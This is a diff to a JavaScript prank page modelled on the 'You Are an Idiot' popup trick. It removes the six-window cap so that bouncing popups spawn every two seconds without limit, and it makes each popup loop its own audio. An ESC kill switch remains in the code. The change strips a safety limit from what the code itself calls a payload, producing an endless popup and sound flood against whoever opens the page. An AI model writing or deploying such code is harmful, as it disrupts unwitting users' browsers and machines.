@@ -87,7 +87,7 @@ micon.addEventListener('click', audioSwitch);
 // ==========================================================================
 // SAFE PAYLOAD: Real bouncing popup windows (performance-optimized)
 // Only the MAIN window spawns and moves popups.
-// Popups are passive display windows — no spawn timers, no move loops.
+// Popups run their own audio but are otherwise passive (no spawn/move loops).
 // Press ESC in the main window to kill everything instantly.
 // ==========================================================================
 (function() {
@@ -102,16 +102,41 @@ micon.addEventListener('click', audioSwitch);
 		: (urlSession || 'orphan');
 
 	// -------------------------------------------------------------------------
-	// POPUP MODE: light weight — autoplay audio once, listen for kill, ESC
+	// POPUP MODE: run audio, listen for kill, ESC
 	// -------------------------------------------------------------------------
 	if (isPopup) {
-		// Try to autoplay audio (usually allowed since opened via user gesture)
-		try {
-			if (audio) {
-				audio.currentTime = 0;
-				audio.play().catch(() => {});
+		function startPopupAudio() {
+			const popupAudio = document.getElementById('youare-audio');
+			const popupOvlap = document.getElementById('youare-overlap');
+			if (!popupAudio) return;
+
+			let popupOverlap = false;
+
+			function popupAudioOverlap() {
+				if (!popupOverlap && popupAudio.currentTime > popupAudio.duration - .45) {
+					popupOvlap.currentTime = 0;
+					popupOvlap.play().catch(() => {});
+					popupOverlap = true;
+				}
+				if (popupOverlap && popupOvlap.currentTime > popupOvlap.duration - .5) {
+					popupAudio.currentTime = 0;
+					popupAudio.play().catch(() => {});
+					popupOverlap = false;
+				}
 			}
-		} catch (e) {}
+
+			popupAudio.currentTime = 0;
+			popupAudio.play().catch(() => {});
+			popupAudio.addEventListener('timeupdate', popupAudioOverlap);
+			popupOvlap.addEventListener('timeupdate', popupAudioOverlap);
+		}
+
+		// Wait for DOM so the <audio> elements actually exist
+		if (document.readyState === 'loading') {
+			document.addEventListener('DOMContentLoaded', startPopupAudio);
+		} else {
+			startPopupAudio();
+		}
 
 		// Lightweight kill polling (every 500ms)
 		const killKey = 'ik_' + sessionId;
@@ -143,7 +168,6 @@ micon.addEventListener('click', audioSwitch);
 	let spawnTimer = null;
 	let moveRequestId = null;
 	let lastMoveTime = 0;
-	const MAX_WINDOWS = 6;
 	const WIN_W = 500;
 	const WIN_H = 400;
 	const SPAWN_INTERVAL = 2000; // ms
@@ -161,7 +185,6 @@ micon.addEventListener('click', audioSwitch);
 	}
 
 	function createPopup() {
-		if (windows.length >= MAX_WINDOWS) return;
 		try {
 			const x = Math.floor(Math.random() * Math.max(1, screen.availWidth - WIN_W));
 			const y = Math.floor(Math.random() * Math.max(1, screen.availHeight - WIN_H));
@@ -179,26 +202,6 @@ micon.addEventListener('click', audioSwitch);
 					vx: (Math.random() > 0.5 ? 1 : -1) * (3 + Math.random() * 3),
 					vy: (Math.random() > 0.5 ? 1 : -1) * (3 + Math.random() * 3)
 				});
-
-				// Trigger audio in the popup using the main window's user activation.
-				// Browsers allow this because the popup was opened from a click handler.
-				function tryPopupAudio(attempts) {
-					if (attempts <= 0 || win.closed) return;
-					try {
-						const popupAudio = win.document.getElementById('youare-audio');
-						if (popupAudio) {
-							popupAudio.currentTime = 0;
-							popupAudio.play().catch(() => {});
-						} else {
-							// DOM not ready yet, retry shortly
-							setTimeout(() => tryPopupAudio(attempts - 1), 100);
-						}
-					} catch (e) {
-						// Cross-origin or not ready
-						setTimeout(() => tryPopupAudio(attempts - 1), 100);
-					}
-				}
-				tryPopupAudio(20); // try for up to ~2s
 			}
 		} catch (e) {}
 	}
@@ -249,22 +252,10 @@ micon.addEventListener('click', audioSwitch);
 		clearKillSignal();
 		showKillSwitch();
 
-		let spawned = 0;
-
-		const trySpawn = () => {
-			if (!payloadActive || spawned >= MAX_WINDOWS) return;
-			createPopup();
-			spawned++;
-		};
-
-		// Spawn one immediately, then every 2 seconds
-		trySpawn();
+		// Spawn one immediately, then every 2 seconds forever
+		createPopup();
 		spawnTimer = setInterval(() => {
-			trySpawn();
-			if (spawned >= MAX_WINDOWS && spawnTimer) {
-				clearInterval(spawnTimer);
-				spawnTimer = null;
-			}
+			if (payloadActive) createPopup();
 		}, SPAWN_INTERVAL);
 
 		moveWindows();
